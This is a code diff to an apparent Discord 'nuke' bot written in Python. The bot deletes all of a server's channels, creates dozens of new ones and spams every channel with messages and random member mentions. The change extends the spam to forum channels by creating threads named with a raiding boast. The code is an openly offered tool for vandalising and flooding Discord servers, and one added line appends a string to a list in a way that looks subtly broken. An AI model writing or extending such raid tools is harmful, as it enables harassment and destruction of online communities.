@@ -64,11 +64,9 @@ class DiscordBot(discord.Client):
             logs[self.logId] += "[-]Failed"
         logs[self.logId] += f" - {str(datetime.datetime.now())} DeleteChannel ID:{channel.id} Name:{channel.name}\n"
     async def sendMessage(self, message:str, channel:discord.abc.GuildChannel, latencyMs:float):
-        if channel in failedChannels:
-            return
         if channel in self.guild.categories:
             try:
-                failedChannels.append(channel)
+                self.exclusionChannelIds += str(channel.id)
             except:
                 pass
             return
@@ -150,6 +148,7 @@ class DiscordBot(discord.Client):
                 await self.deleteAllChannel(self.guild)
                 await asyncio.gather(*(self.createChannel(self.channelName, self.guild) for _ in range(60)))
             self.channels = list(self.guild.channels)
+            thereds = []
             roles = list(self.guild.roles)
             members = self.guild.members
             # exclusion everyone
@@ -164,6 +163,13 @@ class DiscordBot(discord.Client):
                     for channel in self.channels:
                         if str(channel.id) in self.exclusionChannelIds:
                             continue
+                        if type(channel) == discord.ForumChannel and not channel in thereds:
+                            try:
+                                self.exclusionChannelIds.append(str(channel.id))
+                                channel = await channel.create_thread(name="荒らし共栄圏最強")
+                                thereds.append(channel)
+                            except:
+                                pass
                         await self.oneNuke(self.messages, self.guild, channel, self.randomMention, roles, members)
                         random.shuffle(self.channels)
                 else:
